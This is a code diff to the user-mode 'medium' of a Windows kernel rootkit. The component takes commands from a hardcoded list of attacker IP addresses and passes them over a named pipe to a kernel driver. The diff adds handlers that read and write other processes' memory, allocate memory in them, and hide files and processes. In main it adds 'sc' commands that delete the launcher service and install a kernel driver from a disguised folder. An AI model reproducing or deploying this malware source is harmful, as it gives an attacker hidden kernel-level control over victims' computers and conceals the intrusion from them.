@@ -3,6 +3,8 @@
 #include "piping.h"
 
 
+// Global medium variables:
+const char* MainPipeName = "\\\\.\\pipe\\ShrootPipe";
 BOOL ShouldQuit() {
     // Returns if the medium should stop working (debugging, forensics, special errors..) -
     return FALSE;
@@ -10,12 +12,11 @@ BOOL ShouldQuit() {
 
 
 int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, LogFile* MediumLog) {
-    int OprResult = 0;  // TODO: FIX FOR ALL ROOTKIT OPERATIONS, MAKE SURE TO continue IF EQUAL TO -1: PIPE FAILED, IsValidPipe = FALSE, need to create new
+    int OprResult = 0;
     DWORD LastError = 0;
     PASS_DATA result;
     PVOID SendBuf = NULL;
     ULONG SendSize = 0;
-    BOOL IsRootkit = FALSE;
     BOOL IsValidPipe = TRUE;
     ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
     ROOTKIT_MEMORY OprBuffer;
@@ -28,32 +29,17 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
     BOOL ValidInit = FALSE;
     ROOTKIT_UNEXERR SysErrInit = successful;
     char MdlMalloc = 1;
-
-    char GenValue = 212;
     char NextLine = '\n';
     char NullTerm = '\0';
-    std::time_t curr = NULL;
-    tm UtcTime;
-    char TimeData[26];
-    char UtcData[26];
-    const char* RandomMsg1 = "IP data -\n";
-    const char* RandomMsg2 = "Port number -\n";
-    const char* RandomMsg3 = "Communication protocol: IPV4\n";
-    const char* RandomMsg = "Random char numerical value generated: ";
-    const char* BadTime = "Cannot get machine time\n";
-    const char* LocalStr = "Local time on medium -> ";
-    const char* UtcStr = "UTC (global) time on medium -> ";
-    ULONG RandomSize1 = (ULONG)strlen(RandomMsg1) + 1;
-    ULONG RandomSize2 = (ULONG)strlen(RandomMsg2) + 1;
-    ULONG RandomSize3 = (ULONG)strlen(RandomMsg3) + 1;
+
 
 
     while (TRUE) {
         if (!IsValidPipe) {
             // Create valid pipe for communications:
-            IsValidPipe = OpenPipe(PipeHandle, "\\\\.\\pipe\\ShrootPipe", MediumLog);
+            IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
             while (!IsValidPipe) {
-                IsValidPipe = OpenPipe(PipeHandle, "\\\\.\\pipe\\ShrootPipe", MediumLog);
+                IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
             }
 
             // Connect to driver client with pipe:
@@ -97,272 +83,162 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
                 // resend the type of request back to client -
                 result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                 if (!result.err && result.value == sizeof(RootStat)) {
+                    // Receive the main module for the function -
+                    result = root_internet::RecvData(SndInfo.AsoSock, sizeof(InitialSize), &InitialSize, FALSE, 0);
+                    if (!result.err && result.value == sizeof(InitialSize)) {
+                        InitialString = malloc(InitialSize);
+                        if (InitialString != NULL) {
+                            result = root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
+                            if (!result.err && result.value == sizeof(MdlMalloc)) {
+                                result = root_internet::RecvData(SndInfo.AsoSock, InitialSize, InitialString, FALSE, 0);
+                                if (!result.err && result.value == InitialSize) {
+                                    ValidInit = TRUE;
+                                    printf("Init string received - %s\n", (char*)InitialString);
+                                }
+                            }
+                        }
+                        else {
+                            MdlMalloc = 0;
+                            root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
+                        }
+                    }
+
+                    if (!ValidInit) {
+                        if (InitialString != NULL) {
+                            free(InitialString);
+                        }
+                        RootStat = RKOP_NOOPERATION;
+                    }
+                    else {
+                        ValidInit = FALSE;
+                    }
 
                     switch (RootStat) {
-                    case random:
-                        // send random number to client -
-
-                        SendSize = (ULONG)strlen(RandomMsg) + 2;
-                        SendBuf = malloc(SendSize);
-                        if (!SendBuf) {
-                            SendBuf = NULL;
-                            break;
+                    case RKOP_WRITE:
+                        // Write into process virtual memory (from user supplied buffer / another process) -
+                        OprResult = WriteKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
+                        if (OprResult != 1) {
+                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                         }
-
-                        memcpy(SendBuf, RandomMsg, strlen(RandomMsg) + 1);
-                        memcpy((PVOID)((ULONG64)SendBuf + strlen(RandomMsg) + 1), &GenValue, sizeof(GenValue));
+                        free(InitialString);
                         break;
 
-                    case medata:
-                        // send networking data about the client to the client -
-
-                        SendSize = (ULONG)(3 * sizeof(SendSize) + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(SndInfo.AddrInfo) + sizeof(SndInfo.Port));
-                        SendBuf = malloc(SendSize);
-                        if (!SendBuf) {
-                            SendBuf = NULL;
-                            break;
+                    case RKOP_READ:
+                        // Read from process virtual memory -
+                        OprResult = ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
+                        if (OprResult != 1) {
+                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                         }
-
-                        memcpy(SendBuf, &RandomSize1, sizeof(RandomSize1));
-                        memcpy((PVOID)((ULONG64)SendBuf + sizeof(RandomSize1)), RandomMsg1, RandomSize1);
-                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1)), &RandomSize2, sizeof(RandomSize2));
-                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1) * 2), RandomMsg2, RandomSize2);
-                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 2), &RandomSize3, sizeof(RandomSize3));
-                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 3), RandomMsg3, RandomSize3);
-                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(RandomSize1) * 3), &SndInfo.Port, sizeof(SndInfo.Port));
-                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(SndInfo.Port) + sizeof(RandomSize1) * 3), &SndInfo.AddrInfo, sizeof(SndInfo.AddrInfo));
+                        free(LocalRead);
+                        free(InitialString);
                         break;
 
-                    case echo:
-                        // receive a string and send it back to the client -
-
-                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(SendSize), &SendSize, FALSE, 0);
-                        if (result.err || result.value != sizeof(SendSize)) {
-                            SendBuf = NULL;
-                            break;
-                        }
-
-                        SendBuf = malloc(SendSize);
-                        if (!SendBuf) {
-                            SendBuf = NULL;
-                            break;
-                        }
-
-                        result = root_internet::RecvData(SndInfo.AsoSock, SendSize, SendBuf, FALSE, 0);
-                        if (result.err || result.value != SendSize) {
-                            SendBuf = NULL;
-                        }
-                        printf("Received echo string: %s\n", (char*)SendBuf);
-                        break;
-
-                    case timereq:
-                        // send the time on the current system to the client -
-
-                        curr = std::time(0);
-                        ctime_s(TimeData, 26, &curr);
-                        gmtime_s(&UtcTime, &curr);
-                        asctime_s(UtcData, 26, &UtcTime);
-
-                        SendSize = (ULONG)(strlen(TimeData) + strlen(LocalStr) + 3 + strlen(UtcStr) + strlen(UtcData));
-                        SendBuf = malloc(SendSize);
-                        if (!SendBuf) {
-                            printf("Could not allocate memory for sending buffer of current time\n");
-                            SendBuf = NULL;
-                            break;
-                        }
-
-                        memcpy(SendBuf, (void*)LocalStr, strlen(LocalStr));  // Local string, no \0
-                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr)), (void*)TimeData, strlen(TimeData));  // Local time string, no \0
-                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData)), &NextLine, 1);  // NextLine
-                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + 1), (void*)UtcStr, strlen(UtcStr));  // UTC string, no \0
-                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + 1), (void*)UtcData, strlen(UtcData));  // UTC time string, no \0
-                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 1), &NextLine, 1);  // NextLine
-                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 2), &NullTerm, 1);  // NullTerm
-                        break;
-
-                    case terminatereq:
-                        // terminate (request by client) -
-                        closesocket(SndInfo.AsoSock);
-                        return -1;
-
-                    default: IsRootkit = TRUE; break;
-                    }
-
-                    // not an actual rootkit request -
-                    if (!IsRootkit) {
-                        if (SendBuf == NULL || result.err) {
-                            printf("An error occured\n");
-                            if (result.Term && result.err) {
-                                printf("Critical error occured, closing connection with specific client..\n");
-                                closesocket(SndInfo.AsoSock);
-                                return -1;
-                            }
+                    case RKOP_MDLBASE:
+                        // Get the base address of a process module (executable) in memory -
+                        printf("No extra buffer parameters for getting the module base..\n");
+                        OprResult = MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
+                        if (OprResult != 1) {
+                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                         }
                         else {
-                            // Send response buffer -
-
-                            root_internet::SendData(SndInfo.AsoSock, &SendSize, sizeof(SendSize), FALSE, 0);
-                            root_internet::SendData(SndInfo.AsoSock, SendBuf, SendSize, FALSE, 0);
-                            free(SendBuf);
+                            printf("Base address of %s in memory: %p\n", (char*)InitialString, OprBuffer.Out);
                         }
+                        free(InitialString);
+                        break;
 
-                        // Clean important variables and network stack from last request -
-                        root_internet::CleanNetStack(SndInfo.AsoSock);
-                        SendSize = 0;
-                        printf("FINISH MEDIUM FUNCTION FINISHED\n");
-                        SendBuf = NULL;
-                    }
+                    case RKOP_SYSINFO:
+                        // return specific information about the target system (with ZwQuerySystemInformation) -
 
-
-                    else {
-                        // an actual rootkit request -
-
-                        // Receive the main module for the function -
-                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(InitialSize), &InitialSize, FALSE, 0);
-                        if (!result.err && result.value == sizeof(InitialSize)) {
-                            InitialString = malloc(InitialSize);
-                            if (InitialString != NULL) {
-                                result = root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
-                                if (!result.err && result.value == sizeof(MdlMalloc)) {
-                                    result = root_internet::RecvData(SndInfo.AsoSock, InitialSize, InitialString, FALSE, 0);
-                                    if (!result.err && result.value == InitialSize) {
-                                        ValidInit = TRUE;
-                                        printf("Init string received - %s\n", (char*)InitialString);
-                                    }
-                                }
-                            }
-                            else {
-                                MdlMalloc = 0;
-                                root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
-                            }
-                        }
-
-                        if (!ValidInit) {
-                            if (InitialString != NULL) {
-                                free(InitialString);
-                            }
-                            RootStat = RKOP_NOOPERATION;
-                        }
-                        else {
-                            ValidInit = FALSE;
-                        }
-
-                        switch (RootStat) {
-                        case RKOP_WRITE:
-                            // Write into process virtual memory (from user supplied buffer / another process) -
-                            OprResult = WriteKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
-                            if (OprResult != 1) {
-                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
-                            }
+                        if (!ValidateInfoTypeString((char*)InitialString)) {
+                            printf("Client sent invalid system info string\n");
                             free(InitialString);
                             break;
+                        }
 
-                        case RKOP_READ:
-                            // Read from process virtual memory -
-                            OprResult = ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
-                            if (OprResult != 1) {
-                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
-                            }
-                            free(LocalRead);
+                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0);
+                        if (result.err || result.value != sizeof(AttrBufferSize)) {
+                            printf("Cannot get size of initial system buffer\n");
                             free(InitialString);
                             break;
+                        }
 
-                        case RKOP_MDLBASE:
-                            // Get the base address of a process module (executable) in memory -
-                            printf("No extra buffer parameters for getting the module base..\n");
-                            OprResult = MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
-                            if (OprResult != 1) {
-                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
-                            }
-                            else {
-                                printf("Base address of %s in memory: %p\n", (char*)InitialString, OprBuffer.Out);
-                            }
+                        AttrBuffer = malloc(AttrBufferSize);
+                        if (AttrBuffer == NULL) {
+                            printf("Cannot allocate initial system buffer\n");
                             free(InitialString);
-                            break;
-
-                        case RKOP_SYSINFO:
-                            // return specific information about the target system (with ZwQuerySystemInformation) -
-
-                            if (!ValidateInfoTypeString((char*)InitialString)) {
-                                printf("Client sent invalid system info string\n");
+                            SysErrInit = memalloc;
+                        }
+                        if (SysErrInit == successful) {
+                            result = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0);
+                            if (result.err || result.value != AttrBufferSize) {
+                                printf("Cannot get initial system buffer\n");
+                                free(AttrBuffer);
                                 free(InitialString);
                                 break;
                             }
+                        }
 
-                            result = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0);
-                            if (result.err || result.value != sizeof(AttrBufferSize)) {
-                                printf("Cannot get size of initial system buffer\n");
-                                free(InitialString);
-                                break;
-                            }
-
-                            AttrBuffer = malloc(AttrBufferSize);
-                            if (AttrBuffer == NULL) {
-                                printf("Cannot allocate initial system buffer\n");
-                                free(InitialString);
-                                SysErrInit = memalloc;
-                            }
-                            if (SysErrInit == successful) {
-                                result = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0);
-                                if (result.err || result.value != AttrBufferSize) {
-                                    printf("Cannot get initial system buffer\n");
-                                    free(AttrBuffer);
-                                    free(InitialString);
-                                    break;
-                                }
-                            }
-
-                            OprResult = SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, AttrBuffer, (char*)InitialString, SysErrInit, AttrBufferSize, PipeHandle, MediumLog);
-                            if (OprResult != 1) {
-                                printf("Failed operation (sending of returned struct / receiving OG struct/ UNEXPECTED ERROR FROM HERE)\n");
-                            }
-                            else {
-                                result = root_internet::SendData(SndInfo.AsoSock, AttrBuffer, (int)AttrBufferSize, FALSE, 0);
-                                if (result.err || result.value != AttrBufferSize) {
-                                    free(AttrBuffer);
-                                    free(InitialString);
-                                    break;
-                                }
-                            }
-
+                        OprResult = SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, AttrBuffer, (char*)InitialString, SysErrInit, AttrBufferSize, PipeHandle, MediumLog);
+                        if (OprResult != 1) {
+                            printf("Failed operation (sending of returned struct / receiving OG struct/ UNEXPECTED ERROR FROM HERE)\n");
+                        }
+                        else {
                             printf("Success operation system information\n");
-                            free(AttrBuffer);
-                            free(InitialString);
-                            break;
-
-                        case RKOP_PRCMALLOC:
-                            // Allocate memory in a specific process (and leave it committed for now) -
-                            printf("No extra buffer parameters for allocating specific memory..\n");
-                            OprResult = AllocSpecKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
-                            if (OprResult != 1) {
-                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
-                            }
-                            free(InitialString);
-                            break;
-
-                        default:
-                            printf("Error has occurred\n");
-                            if (result.Term) {
-                                printf("Critical error occurred, closing connection with specific client..\n");
-                                closesocket(SndInfo.AsoSock);
-                                return -1;
-                            }
-                            break;
                         }
+                        free(AttrBuffer);
+                        free(InitialString);
+                        break;
 
-                        // Clean important variables and network stack from last request -
-                        root_internet::CleanNetStack(SndInfo.AsoSock);
-                        SendSize = 0;
-                        SendBuf = NULL;
-                        SysErrInit = successful;
-                        if (OprResult == -1) {
-                            IsValidPipe = FALSE;
-                            DisconnectNamedPipe(*PipeHandle);
-                            ClosePipe(PipeHandle);
+                    case RKOP_PRCMALLOC:
+                        // Allocate memory in a specific process (and leave it committed for now) -
+                        printf("No extra buffer parameters for allocating specific memory..\n");
+                        OprResult = AllocSpecKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
+                        if (OprResult != 1) {
+                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                         }
-                        OprResult = 0;
-                        printf("FINISH MEDIUM FUNCTION FINISHED\n");
+                        free(InitialString);
+                        break;
+                    
+                    case RKOP_HIDEFILE:
+                        // Hide file/folder by dynamic request:
+                        OprResult = HideFileKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
+                        if (OprResult != 1) {
+                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
+                        }
+                        free(InitialString);
+                        break;
+                    
+                    case RKOP_HIDEPROC:
+                        // Hide process by dynamic request:
+                        OprResult = HideProcessKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
+                        if (OprResult != 1) {
+                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
+                        }
+                        free(InitialString);
+                        break;
+
+                    default:
+                        printf("Error has occurred\n");
+                        if (result.Term) {
+                            printf("Critical error occurred, closing connection with specific client..\n");
+                            closesocket(SndInfo.AsoSock);
+                            return -1;
+                        }
+                        break;
                     }
+
+                    // Clean important variables and network stack from last request -
+                    root_internet::CleanNetStack(SndInfo.AsoSock);
+                    SendSize = 0;
+                    SendBuf = NULL;
+                    SysErrInit = successful;
+                    if (OprResult == -1) {
+                        IsValidPipe = FALSE;
+                        DisconnectNamedPipe(*PipeHandle);
+                        ClosePipe(PipeHandle);
+                    }
+                    OprResult = 0;
+                    printf("FINISH MEDIUM FUNCTION FINISHED\n");
                 }
             }
 
@@ -403,10 +279,61 @@ int main(int argc, char *argv[]) {
     // HARDCODED VALUE, GENERATED FROM ListAttacker IN trypack\AttackerFile\attackerips.txt
     const char* AttackAddresses = "172.18.144.1~172.19.144.1~172.30.48.1~172.23.32.1~172.17.160.1~172.21.0.1~172.24.112.1~192.168.47.1~192.168.5.1~192.168.1.21~172.20.48.1~192.168.56.1";
 
+
+    // Destroy launching service:
+    if (system("sc stop RootAuto && sc delete RootAuto") == -1) {
+        MediumLog.WriteError("MainMedium pipe - Cannot destroy launching service", GetLastError());
+        MediumLog.CloseLog();
+        return 0;
+    }
+    MediumLog.WriteLog((PVOID)"Destroyed launching service!\n", 30);
+
+
+    // Create dispatch function that will be triggered for CTRL_SHUTDOWN_EVENT:
+    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
+        MediumLog.WriteError("MainMedium pipe - Cannot create control handler to handle reboots", GetLastError());
+        MediumLog.CloseLog();
+        return 0;
+    }
+    MediumLog.WriteLog((PVOID)"Created control handler to handle reboots!\n", 44);
+
+
+    // Get IP addresses of target and attacker:
+    if (!address_config::MatchIpAddresses(SrvIP, SndIP, AttackAddresses)) {
+        MediumLog.WriteError("MainMedium pipe - Cannot find the target address and the matching attacker address", GetLastError());
+        MediumLog.CloseLog();
+        return 0;
+    }
+    printf("Target: %s, Attacker: %s\n", SrvIP, SndIP);
+
+
+    // Make sure that all depended-on files exist on target machine (folders + files):
+    LastError = VerfifyDepDirs();
+    if (LastError != 0) {
+        return LastError;
+    }
+    LastError = VerfifyDepFiles(SndIP);
+    if (LastError != 0) {
+        return LastError;
+    }
+
+
+    // Activate service manager with driver as parameter -
+    system("sc stop KmdfDriver");
+    system("sc delete KmdfDriver");
+    if (system("sc create KmdfDriver type= kernel binPath= \"C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys\" && sc start KmdfDriver") == -1) {
+        //if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
+        MediumLog.WriteError("MainMedium pipe - Failed to activate service manager with driver as parameter", GetLastError());
+        MediumLog.CloseLog();
+        return 0;
+    }
+    MediumLog.WriteLog((PVOID)"Activated service manager with driver as a parameter!\n", 55);
+
+
     // Create valid pipe for communications initial -
-    IsValidPipe = OpenPipe(&PipeHandle, "\\\\.\\pipe\\ShrootPipe", &MediumLog);
+    IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
     while (!IsValidPipe) {
-        IsValidPipe = OpenPipe(&PipeHandle, "\\\\.\\pipe\\ShrootPipe", &MediumLog);
+        IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
     }
 
     // Connect to driver client with pipe initial -
@@ -431,25 +358,6 @@ int main(int argc, char *argv[]) {
     }
 
 
-    // Send initial message with PID of medium:
-    if (InitialKernelCall(&PipeHandle, &MediumLog) == -1) {
-        IsValidPipe = FALSE;
-        DisconnectNamedPipe(PipeHandle);
-        ClosePipe(&PipeHandle);
-        return -1;
-    }
-
-
-    // Get IP addresses of target and attacker -
-    if (!address_config::MatchIpAddresses(SrvIP, SndIP, AttackAddresses)) {
-        printf("[-] Cannot find the target address and the matching attacker address!\n");
-        MediumLog.CloseLog();
-        DisconnectNamedPipe(PipeHandle);
-        ClosePipe(&PipeHandle);
-        return 0;
-    }
-    printf("Target: %s, Attacker: %s\n", SrvIP, SndIP);
-
     root_internet::SetNetStructs(SrvIP, SndIP, SrvPort, SndPort, NetArr);
     int result = root_internet::StartComms(NetArr);
     if (result == 1) {
@@ -470,29 +378,19 @@ int main(int argc, char *argv[]) {
         }
         else {
             NetArr[1].AsoSock = ssckt;
-            result = root_internet::InitConn(NetArr[1], NetArr[0], NetArr[2]);
+            printf("Initialization of connection succeeded, proceeding to start receiving requests..\n");
+            result = MediumAct(NetArr[1], NetArr[0], &PipeHandle, &MediumLog);
+            printf("Disconnected from (%s, %hu)\n", NetArr[1].IP, NetArr[1].Port);
             root_internet::CleanNetStack(NetArr[1].AsoSock);
-            printf(" here 4\n");
-            if (result == 0) {
-                printf("Initialization of connection succeeded, proceeding to start receiving requests..\n");
-                result = MediumAct(NetArr[1], NetArr[0], &PipeHandle, &MediumLog);
-                printf("Disconnected from (%s, %hu)\n", NetArr[1].IP, NetArr[1].Port);
-                root_internet::CleanNetStack(NetArr[1].AsoSock);
 
-                if (result == -1) {
-                    printf("Termination Complete\n");
-                    closesocket(NetArr[0].AsoSock);
-                    WSACleanup();
-                    MediumLog.CloseLog();
-                    DisconnectNamedPipe(PipeHandle);
-                    ClosePipe(&PipeHandle);
-                    return 0;
-                }
-            }
-            else {
-                printf(" here 2\n");
-                printf("Initialization of connection did not work correctly (socket/sender/conninfo errors)\n");
-                closesocket(NetArr[1].AsoSock);
+            if (result == -1) {
+                printf("Termination Complete\n");
+                closesocket(NetArr[0].AsoSock);
+                WSACleanup();
+                MediumLog.CloseLog();
+                DisconnectNamedPipe(PipeHandle);
+                ClosePipe(&PipeHandle);
+                return 0;
             }
         }
     }
